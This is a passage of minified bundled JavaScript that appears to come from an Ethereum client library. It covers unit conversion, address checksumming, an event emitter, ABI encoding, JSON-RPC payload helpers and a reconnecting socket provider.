                return e ? "string" : ii(t)
        }
        throw new xR(t)
    }
      , hn = t => {
        if (typeof t == "number")
            return t > 1e20 ? (console.warn(up),
            BigInt(t)) : t;
        if (typeof t == "bigint")
            return t >= Number.MIN_SAFE_INTEGER && t <= Number.MAX_SAFE_INTEGER ? Number(t) : t;
        if (typeof t == "string" && Ke(t))
            return sc(t);
        try {
            return hn(BigInt(t))
        } catch {
            throw new Gp(t)
        }
    }
      , ps = t => {
        if (typeof t == "number")
            return BigInt(t);
        if (typeof t == "bigint")
            return t;
        if (typeof t == "string" && ud(t))
            return t.startsWith("-") ? -BigInt(t.substring(1)) : BigInt(t);
        throw new Gp(t)
    }
      , IC = (t, e) => {
        let n;
        if (typeof e == "string") {
            if (n = qd[e],
            !n)
                throw new E1(e)
        } else {
            if (e < 0 || !Number.isInteger(e))
                throw new x1(e);
            n = Is(BigInt(10), BigInt(e))
        }
        const s = String(hn(t))
          , o = n.toString().length - 1;
        if (o <= 0)
            return s.toString();
        const l = s.padStart(o, "0")
          , u = l.slice(0, -o)
          , d = l.slice(-o).replace(/\.?0+$/, "");
        return u === "" ? d ? `0.${d}` : "0" : d === "" ? u : `${u}.${d}`.slice(0, u.length + o + 1)
    }
      , kC = (t, e) => {
        Ae.validate(["number"], [t]);
        let n;
        if (typeof e == "string") {
            if (n = qd[e],
            !n)
                throw new E1(e)
        } else {
            if (e < 0 || !Number.isInteger(e))
                throw new x1(e);
            n = Is(BigInt(10), BigInt(e))
        }
        let s = t;
        typeof s == "number" && (s < 1e-15 && console.warn(up),
        s > 1e20 ? (console.warn(up),
        s = BigInt(s)) : s = s.toLocaleString("fullwide", {
            useGrouping: !1,
            maximumFractionDigits: 20
        }));
        const [o,l] = String(typeof s == "string" && !Ke(s) ? s : hn(s)).split(".").concat("")
          , d = BigInt(`${o}${l}`) * n
          , p = l.length;
        return p === 0 ? d.toString() : d.toString().slice(0, -p)
    }
      , _i = t => {
        if (!Sn(t, !1))
            throw new qp(t);
        const e = t.toLowerCase().replace(/^0x/i, "")
          , n = sr(Jt(Hd(t0(e))));
        if (q(n) || n === "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470")
            return "";
        let s = "0x";
        const o = n.replace(/^0x/i, "");
        for (let l = 0; l < e.length; l += 1)
            parseInt(o[l], 16) > 7 ? s += e[l].toUpperCase() : s += e[l];
        return s
    }
      , iw = t => {
        if (typeof t == "boolean")
            return t;
        if (typeof t == "number" && (t === 0 || t === 1) || typeof t == "bigint" && (t === BigInt(0) || t === BigInt(1)))
            return !!t;
        if (typeof t == "string" && !Ke(t) && (t === "1" || t === "0" || t === "false" || t === "true"))
            return t === "true" ? !0 : t === "false" ? !1 : !!Number(t);
        if (typeof t == "string" && Ke(t) && (t === "0x1" || t === "0x0"))
            return !!hn(t);
        throw new Fp(t)
    }
    ;
    var km = {
        exports: {}
    }, gA;
    function OC() {
        return gA || (gA = 1,
        function(t) {
            var e = Object.prototype.hasOwnProperty
              , n = "~";
            function s() {}
            Object.create && (s.prototype = Object.create(null),
            new s().__proto__ || (n = !1));
            function o(p, h, m) {
                this.fn = p,
                this.context = h,
                this.once = m || !1
            }
            function l(p, h, m, y, w) {
                if (typeof m != "function")
                    throw new TypeError("The listener must be a function");
                var E = new o(m,y || p,w)
                  , S = n ? n + h : h;
                return p._events[S] ? p._events[S].fn ? p._events[S] = [p._events[S], E] : p._events[S].push(E) : (p._events[S] = E,
                p._eventsCount++),
                p
            }
            function u(p, h) {
                --p._eventsCount === 0 ? p._events = new s : delete p._events[h]
            }
            function d() {
                this._events = new s,
                this._eventsCount = 0
            }
            d.prototype.eventNames = function() {
                var h = [], m, y;
                if (this._eventsCount === 0)
                    return h;
                for (y in m = this._events)
                    e.call(m, y) && h.push(n ? y.slice(1) : y);
                return Object.getOwnPropertySymbols ? h.concat(Object.getOwnPropertySymbols(m)) : h
            }
            ,
            d.prototype.listeners = function(h) {
                var m = n ? n + h : h
                  , y = this._events[m];
                if (!y)
                    return [];
                if (y.fn)
                    return [y.fn];
                for (var w = 0, E = y.length, S = new Array(E); w < E; w++)
                    S[w] = y[w].fn;
                return S
            }
            ,
            d.prototype.listenerCount = function(h) {
                var m = n ? n + h : h
                  , y = this._events[m];
                return y ? y.fn ? 1 : y.length : 0
            }
            ,
            d.prototype.emit = function(h, m, y, w, E, S) {
                var _ = n ? n + h : h;
                if (!this._events[_])
                    return !1;
                var x = this._events[_], b = arguments.length, I, O;
                if (x.fn) {
                    switch (x.once && this.removeListener(h, x.fn, void 0, !0),
                    b) {
                    case 1:
                        return x.fn.call(x.context),
                        !0;
                    case 2:
                        return x.fn.call(x.context, m),
                        !0;
                    case 3:
                        return x.fn.call(x.context, m, y),
                        !0;
                    case 4:
                        return x.fn.call(x.context, m, y, w),
                        !0;
                    case 5:
                        return x.fn.call(x.context, m, y, w, E),
                        !0;
                    case 6:
                        return x.fn.call(x.context, m, y, w, E, S),
                        !0
                    }
                    for (O = 1,
                    I = new Array(b - 1); O < b; O++)
                        I[O - 1] = arguments[O];
                    x.fn.apply(x.context, I)
                } else {
                    var z = x.length, L;
                    for (O = 0; O < z; O++)
                        switch (x[O].once && this.removeListener(h, x[O].fn, void 0, !0),
                        b) {
                        case 1:
                            x[O].fn.call(x[O].context);
                            break;
                        case 2:
                            x[O].fn.call(x[O].context, m);
                            break;
                        case 3:
                            x[O].fn.call(x[O].context, m, y);
                            break;
                        case 4:
                            x[O].fn.call(x[O].context, m, y, w);
                            break;
                        default:
                            if (!I)
                                for (L = 1,
                                I = new Array(b - 1); L < b; L++)
                                    I[L - 1] = arguments[L];
                            x[O].fn.apply(x[O].context, I)
                        }
                }
                return !0
            }
            ,
            d.prototype.on = function(h, m, y) {
                return l(this, h, m, y, !1)
            }
            ,
            d.prototype.once = function(h, m, y) {
                return l(this, h, m, y, !0)
            }
            ,
            d.prototype.removeListener = function(h, m, y, w) {
                var E = n ? n + h : h;
                if (!this._events[E])
                    return this;
                if (!m)
                    return u(this, E),
                    this;
                var S = this._events[E];
                if (S.fn)
                    S.fn === m && (!w || S.once) && (!y || S.context === y) && u(this, E);
                else {
                    for (var _ = 0, x = [], b = S.length; _ < b; _++)
                        (S[_].fn !== m || w && !S[_].once || y && S[_].context !== y) && x.push(S[_]);
                    x.length ? this._events[E] = x.length === 1 ? x[0] : x : u(this, E)
                }
                return this
            }
            ,
            d.prototype.removeAllListeners = function(h) {
                var m;
                return h ? (m = n ? n + h : h,
                this._events[m] && u(this, m)) : (this._events = new s,
                this._eventsCount = 0),
                this
            }
            ,
            d.prototype.off = d.prototype.removeListener,
            d.prototype.addListener = d.prototype.on,
            d.prefixed = n,
            d.EventEmitter = d,
            t.exports = d
        }(km)),
        km.exports
    }
    var NC = OC();
    const rw = jp(NC);
    class n0 extends rw {
        constructor() {
            super(...arguments),
            this.maxListeners = Number.MAX_SAFE_INTEGER
        }
        setMaxListeners(e) {
            return this.maxListeners = e,
            this
        }
        getMaxListeners() {
            return this.maxListeners
        }
    }
    const MC = Ke
      , DC = ud
      , LC = J1
      , UC = Sn
      , jC = oo
      , PC = zd
      , HC = pC
      , zC = gC
      , GC = hd
      , qC = vC
      , FC = (t, e) => {
        const n = typeof t == "string" && jt(t)
          , s = typeof e == "string" && jt(e);
        if (t === e || (t === "earliest" || t === 0) && (e === "earliest" || e === 0))
            return 0;
        if (t === "earliest")
            return -1;
        if (e === "earliest")
            return 1;
        if (n && s) {
            const u = {
                [Xi.EARLIEST]: 1,
                [Xi.FINALIZED]: 2,
                [Xi.SAFE]: 3,
                [Xi.LATEST]: 4,
                [Xi.PENDING]: 5
            };
            return u[t] < u[e] ? -1 : 1
        }
        if (n && !s || !n && s)
            throw new TR("Cannot compare blocktag with provided non-blocktag input.");
        const o = BigInt(t)
          , l = BigInt(e);
        return o < l ? -1 : o === l ? 0 : 1
    }
      , Dr = t => typeof t == "object" && !q(t) && Object.keys(t).length !== 0 && ["input", "data", "from", "gas", "gasPrice", "gasLimit", "address", "jsonInterface", "syncWithContext", "dataInputFill"].some(e => e in t)
      , Ee = q
      , yA = t => typeof t == "object" && !q(t) && !Array.isArray(t) && !(t instanceof Hp)
      , Vr = (t, ...e) => {
        if (!yA(t))
            return t;
        const n = Object.assign({}, t);
        for (const s of e)
            for (const o in s)
                yA(s[o]) ? (n[o] || (n[o] = {}),
                n[o] = Vr(n[o], s[o])) : !q(s[o]) && Object.hasOwnProperty.call(s, o) && (Array.isArray(s[o]) || s[o]instanceof Hp ? n[o] = s[o].slice(0) : n[o] = s[o]);
        return n
    }
      , Ka = (t, e, n="0") => typeof t == "string" ? Ke(t) ? fd(t, e, n) : t.padStart(e, n) : (Ae.validate(["int"], [t]),
    fd(t, e, n))
      , sw = (t, e, n="0") => {
        if (typeof t == "string" && !Ke(t))
            return t.padEnd(e, n);
        const s = typeof t == "string" && Ke(t) ? t : kt(t)
          , o = s.startsWith("-") ? 3 : 2;
        return Ae.validate([s.startsWith("-") ? "int" : "uint"], [t]),
        s.padEnd(e + o, n)
    }
      , aw = sw
      , ql = Ka
      , ow = (t, e=64) => {
        Ae.validate(["int"], [t]);
        const n = hn(t);
        if (n >= 0)
            return Ka(ir(n), e);
        const s = Is(BigInt(2), BigInt(e * 4));
        if (-n >= s)
            throw new S1(`value: ${t}, nibbleWidth: ${e}`);
        const l = BigInt(n) + s;
        return Ka(kt(l), e)
    }
      , QC = (t, e=64) => {
        Ae.validate(["int"], [t]);
        const n = hn(t);
        if (n < 0)
            return n;
        const s = Math.ceil(Math.log(Number(n)) / Math.log(2));
        if (s > e * 4)
            throw new S1(`value: "${t}", nibbleWidth: "${e}"`);
        if (e * 4 !== s)
            return n;
        const o = Is(BigInt(2), BigInt(e) * BigInt(4));
        return hn(BigInt(n) - o)
    }
      , {parseBaseType: VC} = X1
      , Ki = t => typeof t == "object" && !q(t) && "number"in t && "bytes"in t
      , YC = (t, e, n=[]) => {
        let s = Object.assign({}, t), o;
        for (const l of e) {
            if (s.oneOf && o) {
                const u = o
                  , d = n.find( ([p]) => p === u);
                d && d[0] === o && (s = s.oneOf[d[1]])
            }
            if (!s.properties && !s.items)
                return;
            s.properties ? s = s.properties[l] : s.items && s.items.properties ? s = s.items.properties[l] : s.items && Za(s.items) ? s = s.items : s.items && Array.isArray(s.items) && (s = s.items[parseInt(l, 10)]),
            s && l && (o = l)
        }
        return s
    }
      , Fl = (t, e, n) => {
        try {
            const {baseType: s, baseTypeSize: o} = VC(e);
            if (s === "int" || s === "uint")
                switch (n.number) {
                case Qn.NUMBER:
                    return Number(ps(t));
                case Qn.HEX:
                    return kt(ps(t));
                case Qn.STR:
                    return ps(t).toString();
                case Qn.BIGINT:
                    return ps(t);
                default:
                    throw new ep(`Invalid format: ${String(n.number)}`)
                }
            if (s === "bytes") {
                let l;
                switch (o ? typeof t == "string" ? l = Ka(t, o * 2) : Qr(t) && (l = nn(new Uint8Array(o - t.length), t)) : l = t,
                n.bytes) {
                case er.HEX:
                    return je(Ai(l));
                case er.UINT8ARRAY:
                    return Ai(l);
                default:
                    throw new ep(`Invalid format: ${String(n.bytes)}`)
                }
            }
            if (s === "string")
                return String(t)
        } catch {
            return t
        }
        return t
    }
      , vA = ({value: t, schemaProp: e, schema: n, object: s, key: o, dataPath: l, format: u, oneOfPath: d=[]}) => {
        var p, h;
        if (Array.isArray(t)) {
            let m = e;
            if (e?.oneOf !== void 0 && e.oneOf.forEach( (y, w) => {
                var E, S;
                !Array.isArray(e?.items) && (typeof t[0] == "object" && ((E = y?.items) === null || E === void 0 ? void 0 : E.type) === "object" || typeof t[0] == "string" && ((S = y?.items) === null || S === void 0 ? void 0 : S.type) !== "object") && (m = y,
                d.push([o, w]))
            }
            ),
            q(m?.items))
                return delete s[o],
                l.pop(),
                !0;
            if (Za(m.items) && !q(m.items.format)) {
                for (let y = 0; y < t.length; y += 1)
                    s[o][y] = Fl(t[y], (p = m?.items) === null || p === void 0 ? void 0 : p.format, u);
                return l.pop(),
                !0
            }
            if (!Array.isArray(m?.items) && ((h = m?.items) === null || h === void 0 ? void 0 : h.type) === "object") {
                for (const y of t)
                    Qd(y, n, l, u, d);
                return l.pop(),
                !0
            }
            if (Array.isArray(m?.items)) {
                for (let y = 0; y < t.length; y += 1)
                    s[o][y] = Fl(t[y], m.items[y].format, u);
                return l.pop(),
                !0
            }
        }
        return !1
    }
      , Qd = (t, e, n, s, o=[]) => {
        var l;
        if (!Za(t) && !Array.isArray(t))
            return Fl(t, e?.format, s);
        const u = t;
        if (Array.isArray(u) && e?.type === "array" && ((l = e?.items) === null || l === void 0 ? void 0 : l.type) === "object")
            vA({
                value: u,
                schemaProp: e,
                schema: e,
                object: u,
                key: "",
                dataPath: n,
                format: s,
                oneOfPath: o
            });
        else
            for (const [d,p] of Object.entries(u)) {
                n.push(d);
                let h = YC(e, n, o);
                if (q(h)) {
                    delete u[d],
                    n.pop();
                    continue
                }
                if (Za(p)) {
                    Qd(p, e, n, s, o),
                    n.pop();
                    continue
                }
                if (!vA({
                    value: p,
                    schemaProp: h,
                    schema: e,
                    object: u,
                    key: d,
                    dataPath: n,
                    format: s,
                    oneOfPath: o
                })) {
                    if (h?.format === void 0 && h?.oneOf !== void 0) {
                        for (const [m,y] of h.oneOf.entries())
                            if (y?.format !== void 0) {
                                h = y;
                                break
                            }
                    }
                    u[d] = Fl(p, h.format, s),
                    n.pop()
                }
            }
        return u
    }
      , ee = (t, e, n=$t) => {
        let s;
        Za(e) ? s = Vr({}, e) : Array.isArray(e) ? s = [...e] : s = e;
        const o = Za(t) ? t : Wp(t);
        if (!o.properties && !o.items && !o.format)
            throw new ep("Invalid json schema for formatting");
        return Qd(s, o, [], n)
    }
      , lw = "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470"
      , Xa = t => {
        let e;
        return typeof t == "bigint" || typeof t == "number" ? e = Ga(t.toString()) : Array.isArray(t) ? e = new Uint8Array(t) : typeof t == "string" && !Ke(t) ? e = Ga(t) : e = Ai(t),
        je(Jt(Hd(e)))
    }
      , ac = t => {
        let e;
        typeof t == "string" ? t.startsWith("0x") && Ke(t) ? e = lt(t) : e = Ga(t) : e = t;
        const n = Xa(e);
        return n === lw ? void 0 : n
    }
      , Tn = t => {
        const e = ac(t);
        return q(e) ? lw : e
    }
      , ZC = t => {
        if (Array.isArray(t))
            throw new Error("Autodetection of array types is not supported.");
        let e, n;
        if (typeof t == "object" && ("t"in t || "type"in t) && ("v"in t || "value"in t))
            e = "t"in t ? t.t : t.type,
            n = "v"in t ? t.v : t.value,
            e = e.toLowerCase() === "bigint" ? "int" : e;
        else {
            if (typeof t == "bigint")
                return ["int", t];
            e = ir(t, !0),
            n = ir(t),
            !e.startsWith("int") && !e.startsWith("uint") && (e = "bytes")
        }
        return (e.startsWith("int") || e.startsWith("uint")) && typeof n == "string" && !/^(-)?0x/i.test(n) && (n = ps(n)),
        [e, n]
    }
      , KC = t => t.startsWith("int[") ? `int256${t.slice(3)}` : t === "int" ? "int256" : t.startsWith("uint[") ? `uint256'${t.slice(4)}` : t === "uint" ? "uint256" : t
      , Om = (t, e) => {
        const n = /^(\d+).*$/.exec(t.slice(e));
        return n ? parseInt(n[1], 10) : 0
    }
      , bA = t => t.toString(2).length
      , AA = (t, e) => {
        const n = e.toString();
        if (t === "string") {
            if (typeof e == "string")
                return ii(e);
            throw new ER(e)
        }
        if (t === "bool" || t === "boolean") {
            if (typeof e == "boolean")
                return e ? "01" : "00";
            throw new Fp(e)
        }
        if (t === "address") {
            if (!Sn(n))
                throw new qp(n);
            return n
        }
        const s = KC(t);
        if (t.startsWith("uint")) {
            const o = Om(s, 4);
            if (o % 8 || o < 8 || o > 256)
                throw new nA(n);
            const l = hn(n);
            if (bA(l) > o)
                throw new iA(n);
            if (l < BigInt(0))
                throw new SR(n);
            return o ? ql(l.toString(16), o / 8 * 2) : l.toString(16)
        }
        if (t.startsWith("int")) {
            const o = Om(s, 3);
            if (o % 8 || o < 8 || o > 256)
                throw new nA(t);
            const l = hn(n);
            if (bA(l) > o)
                throw new iA(n);
            return l < BigInt(0) ? ow(l.toString(), o / 8 * 2) : o ? ql(l.toString(16), o / 4) : l.toString(16)
        }
        if (s === "bytes") {
            if (n.replace(/^0x/i, "").length % 2 !== 0)
                throw new ja(n);
            return n
        }
        if (t.startsWith("bytes")) {
            if (n.replace(/^0x/i, "").length % 2 !== 0)
                throw new ja(n);
            const o = Om(t, 5);
            if (!o || o < 1 || o > 64 || o < n.replace(/^0x/i, "").length / 2)
                throw new ja(n);
            return aw(n, o * 2)
        }
        return ""
    }
      , cw = t => {
        const [e,n] = ZC(t);
        return Array.isArray(n) ? n.map(l => AA(e, l).replace("0x", "")).join("") : AA(e, n).replace("0x", "")
    }
      , i0 = (...t) => `0x${t.map(cw).join("").toLowerCase()}`
      , XC = (...t) => ac(i0(...t))
      , JC = (...t) => Tn(i0(...t))
      , $C = t => ac(`0x${(typeof t == "number" ? t.toString() : t).padStart(64, "0")}`);
    function WC(t) {
        return I1(t)
    }
    const Ql = t => WC(t)
      , eI = t => je(Ql(t));
    var Vd = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function uw(t) {
        return (typeof t == "object" || typeof t == "function") && typeof t.then == "function"
    }
    function dw(t, e, n) {
        return Vd(this, void 0, void 0, function*() {
            let s;
            const o = yield Promise.race([t instanceof Promise ? t : t(), new Promise( (l, u) => {
                s = setTimeout( () => n ? u(n) : l(void 0), e)
            }
            )]);
            if (s && clearTimeout(s),
            o instanceof Error)
                throw o;
            return o
        })
    }
    function r0(t, e) {
        let n;
        return [new Promise( (o, l) => {
            n = setInterval(function u() {
                return Vd(this, void 0, void 0, function*() {
                    try {
                        const d = yield dw(t, e);
                        q(d) || (clearInterval(n),
                        o(d))
                    } catch (d) {
                        clearInterval(n),
                        l(d)
                    }
                }),
                u
            }(), e)
        }
        ), n]
    }
    function tI(t, e) {
        return Vd(this, void 0, void 0, function*() {
            return r0(t, e)[0]
        })
    }
    function s0(t, e) {
        let n;
        const s = new Promise( (o, l) => {
            n = setTimeout( () => {
                l(e)
            }
            , t)
        }
        );
        return [n, s]
    }
    function fw(t, e) {
        let n;
        const s = new Promise( (o, l) => {
            n = setInterval( () => {
                Vd(this, void 0, void 0, function*() {
                    const u = yield t();
                    u && (clearInterval(n),
                    l(u))
                })
            }
            , e)
        }
        );
        return [n, s]
    }
    const a0 = () => {
        const t = Ql(16);
        t[6] = t[6] & 15 | 64,
        t[8] = t[8] & 63 | 128;
        const e = je(t);
        return [e.substring(2, 10), e.substring(10, 14), e.substring(14, 18), e.substring(18, 22), e.substring(22, 34)].join("-")
    }
      , o0 = t => {
        const e = t.error.code;
        return en.has(e) || e >= -32099 && e <= -32e3
    }
      , Ur = t => !Array.isArray(t) && !!t && t.jsonrpc === "2.0" && "result"in t && q(t.error) && (typeof t.id == "number" || typeof t.id == "string")
      , jr = t => !Array.isArray(t) && t.jsonrpc === "2.0" && !!t && q(t.result) && "error"in t && (typeof t.id == "number" || typeof t.id == "string")
      , Yd = t => !Array.isArray(t) && !!t && t.jsonrpc === "2.0" && !q(t.params) && !q(t.method)
      , hw = t => !Array.isArray(t) && !!t && t.jsonrpc === "2.0" && "id"in t && "result"in t
      , md = t => Ur(t) || jr(t)
      , l0 = t => Array.isArray(t) ? t.every(md) : md(t)
      , Vl = t => Array.isArray(t) && t.length > 0 && l0(t);
    let Du;
    const mw = t => {
        Du = t
    }
      , Os = t => {
        var e, n, s, o;
        return typeof Du < "u" && (Du += 1),
        {
            jsonrpc: (e = t.jsonrpc) !== null && e !== void 0 ? e : "2.0",
            id: (s = (n = t.id) !== null && n !== void 0 ? n : Du) !== null && s !== void 0 ? s : a0(),
            method: t.method,
            params: (o = t.params) !== null && o !== void 0 ? o : void 0
        }
    }
      , c0 = t => t.map(e => Os(e))
      , di = t => Array.isArray(t) && t.length > 0
      , nI = Object.freeze(Object.defineProperty({
        __proto__: null,
        isBatchRequest: di,
        isBatchResponse: Vl,
        isResponseRpcError: o0,
        isResponseWithError: jr,
        isResponseWithNotification: Yd,
        isResponseWithResult: Ur,
        isSubscriptionResult: hw,
        isValidResponse: l0,
        setRequestIdStart: mw,
        toBatchPayload: c0,
        toPayload: Os,
        validateResponse: md
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    var Nm = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    }, pw;
    class pd {
        constructor({timeout: e, eagerStart: n, timeoutMessage: s}={
            timeout: 0,
            eagerStart: !1,
            timeoutMessage: "DeferredPromise timed out"
        }) {
            this[pw] = "Promise",
            this._state = "pending",
            this._promise = new Promise( (o, l) => {
                this._resolve = o,
                this._reject = l
            }
            ),
            this._timeoutMessage = s,
            this._timeoutInterval = e,
            n && this.startTimer()
        }
        get state() {
            return this._state
        }
        then(e, n) {
            return Nm(this, void 0, void 0, function*() {
                return this._promise.then(e, n)
            })
        }
        catch(e) {
            return Nm(this, void 0, void 0, function*() {
                return this._promise.catch(e)
            })
        }
        finally(e) {
            return Nm(this, void 0, void 0, function*() {
                return this._promise.finally(e)
            })
        }
        resolve(e) {
            this._resolve(e),
            this._state = "fulfilled",
            this._clearTimeout()
        }
        reject(e) {
            this._reject(e),
            this._state = "rejected",
            this._clearTimeout()
        }
        startTimer() {
            this._timeoutInterval && this._timeoutInterval > 0 && (this._timeoutId = setTimeout(this._checkTimeout.bind(this), this._timeoutInterval))
        }
        _checkTimeout() {
            this._state === "pending" && this._timeoutId && this.reject(new p1(this._timeoutMessage))
        }
        _clearTimeout() {
            this._timeoutId && clearTimeout(this._timeoutId)
        }
    }
    pw = Symbol.toStringTag;
    class gw {
        constructor(e, n) {
            this.eventEmitter = e,
            this.autoReconnect = n,
            this.chunkTimeout = 1e3 * 15
        }
        clearQueues() {
            typeof this._clearQueues == "function" && this._clearQueues()
        }
        onError(e) {
            this._clearQueues = e
        }
        parseResponse(e) {
            const n = [];
            return e.replace(/\}[\n\r]?\{/g, "}|--|{").replace(/\}\][\n\r]?\[\{/g, "}]|--|[{").replace(/\}[\n\r]?\[\{/g, "}|--|[{").replace(/\}\][\n\r]?\{/g, "}]|--|{").split("|--|").forEach(o => {
                let l = o;
                this.lastChunk && (l = this.lastChunk + l);
                let u;
                try {
                    u = JSON.parse(l)
                } catch {
                    this.lastChunk = l,
                    this.lastChunkTimeout && clearTimeout(this.lastChunkTimeout),
                    this.lastChunkTimeout = setTimeout( () => {
                        this.autoReconnect || (this.clearQueues(),
                        this.eventEmitter.emit("error", new Ld({
                            id: 1,
                            jsonrpc: "2.0",
                            error: {
                                code: 2,
                                message: "Chunk timeout"
                            }
                        })))
                    }
                    , this.chunkTimeout);
                    return
                }
                clearTimeout(this.lastChunkTimeout),
                this.lastChunk = void 0,
                u && n.push(u)
            }
            ),
            n
        }
    }
    var wA = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class u0 extends nc {
        constructor() {
            super(...arguments),
            this._eventEmitter = new rw,
            this._chainId = "",
            this._accounts = []
        }
        _getChainId() {
            return wA(this, void 0, void 0, function*() {
                var e;
                const n = yield this.request(Os({
                    method: "eth_chainId",
                    params: []
                }));
                return (e = n?.result) !== null && e !== void 0 ? e : ""
            })
        }
        _getAccounts() {
            return wA(this, void 0, void 0, function*() {
                var e;
                const n = yield this.request(Os({
                    method: "eth_accounts",
                    params: []
                }));
                return (e = n?.result) !== null && e !== void 0 ? e : []
            })
        }
        _onConnect() {
            Promise.all([this._getChainId().then(e => {
                e !== this._chainId && (this._chainId = e,
                this._eventEmitter.emit("chainChanged", this._chainId))
            }
            ).catch(e => {
                console.error(e)
            }
            ), this._getAccounts().then(e => {
                this._accounts.length === e.length && e.every(n => e.includes(n)) || (this._accounts = e,
                this._onAccountsChanged())
            }
            ).catch(e => {
                console.error(e)
            }
            )]).then( () => this._eventEmitter.emit("connect", {
                chainId: this._chainId
            })).catch(e => {
                console.error(e)
            }
            )
        }
        _onDisconnect(e, n) {
            this._eventEmitter.emit("disconnect", new BR(e,n))
        }
        _onAccountsChanged() {
            this._eventEmitter.emit("accountsChanged", this._accounts)
        }
    }
    var Mm = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const iI = {
        autoReconnect: !0,
        delay: 5e3,
        maxAttempts: 5
    }
      , rI = 1e3;
    class yw extends u0 {
        get SocketConnection() {
            return this._socketConnection
        }
        constructor(e, n, s) {
            if (super(),
            this._connectionStatus = "connecting",
            this._onMessageHandler = this._onMessage.bind(this),
            this._onOpenHandler = this._onConnect.bind(this),
            this._onCloseHandler = this._onCloseEvent.bind(this),
            this._onErrorHandler = this._onError.bind(this),
            !this._validateProviderPath(e))
                throw new tp(e);
            this._socketPath = e,
            this._socketOptions = n,
            this._reconnectOptions = Object.assign(Object.assign({}, iI), s ?? {}),
            this._pendingRequestsQueue = new Map,
            this._sentRequestsQueue = new Map,
            this._init(),
            this.connect(),
            this.chunkResponseParser = new gw(this._eventEmitter,this._reconnectOptions.autoReconnect),
            this.chunkResponseParser.onError( () => {
                this._clearQueues()
            }
            ),
            this.isReconnecting = !1
        }
        _init() {
            this._reconnectAttempts = 0
        }
        connect() {
            try {
                this._openSocketConnection(),
                this._connectionStatus = "connecting",
                this._addSocketListeners()
            } catch (e) {
                if (this.isReconnecting)
                    setImmediate( () => {
                        this._reconnect()
                    }
                    );
                else
                    throw this._connectionStatus = "disconnected",
                    e && e.message ? new ic(`Error while connecting to ${this._socketPath}. Reason: ${e.message}`) : new tp(this._socketPath)
            }
        }
        _validateProviderPath(e) {
            return !!e
        }
        getPendingRequestQueueSize() {
            return this._pendingRequestsQueue.size
        }
        getSentRequestsQueueSize() {
            return this._sentRequestsQueue.size
        }
        supportsSubscriptions() {
            return !0
        }
        on(e, n) {
            this._eventEmitter.on(e, n)
        }
        once(e, n) {
            this._eventEmitter.once(e, n)
        }
        removeListener(e, n) {
            this._eventEmitter.removeListener(e, n)
        }
        _onDisconnect(e, n) {
            this._connectionStatus = "disconnected",
            super._onDisconnect(e, n)
        }
        disconnect(e, n) {
            const s = e ?? rI;
            this._removeSocketListeners(),
            this.getStatus() !== "disconnected" && this._closeSocketConnection(s, n),
            this._onDisconnect(s, n)
        }
        safeDisconnect(e, n) {
            return Mm(this, arguments, void 0, function*(s, o, l=!1, u=1e3) {
                let d = 0;
                yield Mm(this, void 0, void 0, function*() {
                    return new Promise(h => {
                        const m = setInterval( () => {
                            l && d >= 5 && this.clearQueues(),
                            this.getPendingRequestQueueSize() === 0 && this.getSentRequestsQueueSize() === 0 && (clearInterval(m),
                            h(!0)),
                            d += 1
                        }
                        , u)
                    }
                    )
                }),
                this.disconnect(s, o)
            })
        }
        removeAllListeners(e) {
            this._eventEmitter.removeAllListeners(e)
        }
        _onError(e) {
            this.isReconnecting ? this._reconnect() : this._eventEmitter.emit("error", e)
        }
        reset() {
            this._sentRequestsQueue.clear(),
            this._pendingRequestsQueue.clear(),
            this._init(),
            this._removeSocketListeners(),
            this._addSocketListeners()
        }
        _reconnect() {
            this.isReconnecting || (this.isReconnecting = !0,
            this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach( (e, n) => {
                e.deferredPromise.reject(new qT),
                this._sentRequestsQueue.delete(n)
            }
            ),
            this._reconnectAttempts < this._reconnectOptions.maxAttempts ? (this._reconnectAttempts += 1,
            setTimeout( () => {
                this._removeSocketListeners(),
                this.connect(),
                this.isReconnecting = !1
            }
            , this._reconnectOptions.delay)) : (this.isReconnecting = !1,
            this._clearQueues(),
            this._removeSocketListeners(),
            this._eventEmitter.emit("error", new GT(this._reconnectOptions.maxAttempts))))
        }
        request(e) {
            return Mm(this, void 0, void 0, function*() {
                if (Ee(this._socketConnection))
                    throw new Error("Connection is undefined");
                this.getStatus() === "disconnected" && this.connect();
                const n = di(e) ? e[0].id : e.id;
                if (!n)
                    throw new XT("Request Id not defined");
                if (this._sentRequestsQueue.has(n))
                    throw new FT(n);
                const s = new pd;
                s.catch(l => {
                    this._eventEmitter.emit("error", l)
                }
                );
                const o = {
                    payload: e,
                    deferredPromise: s
                };
